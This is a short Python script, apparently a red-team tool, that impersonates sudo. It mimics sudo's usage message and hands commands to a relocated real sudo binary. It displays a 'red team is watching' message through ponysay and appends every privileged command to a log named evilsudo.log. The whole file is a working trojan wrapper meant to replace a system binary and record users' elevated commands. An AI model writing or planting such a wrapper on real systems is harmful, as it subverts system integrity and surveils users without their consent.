import sys
import subprocess
import shlex
from datetime import datetime

LOG_FILE = "/var/lib/evilsudo.log"

def main():
    if len(sys.argv) < 2:
        print("usage: sudo -h | -K | -k | -V")
        sys.exit(1)

    # Everything after the script name (equivalent to "$@")
    user_args = sys.argv[1:]

    # Build sudo command
    sudo_cmd = ["/var/lib/apt/sudo"] + user_args

    # Run sudo command
    result = subprocess.run(sudo_cmd)

    # If sudo command succeeded, run ponysay (suppress stderr)
    if result.returncode == 0:
        subprocess.run(
            ["ponysay", "red team is watching"],
            stderr=subprocess.DEVNULL
        )

    # Log the original command
    timestamp = datetime.now().isoformat()
    logged_command = " ".join(shlex.quote(arg) for arg in user_args)

    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp} - {logged_command}\n")
    except PermissionError:
        print("Permission denied: cannot write to {}".format(LOG_FILE))

    sys.exit(result.returncode)


if __name__ == "__main__":
    main()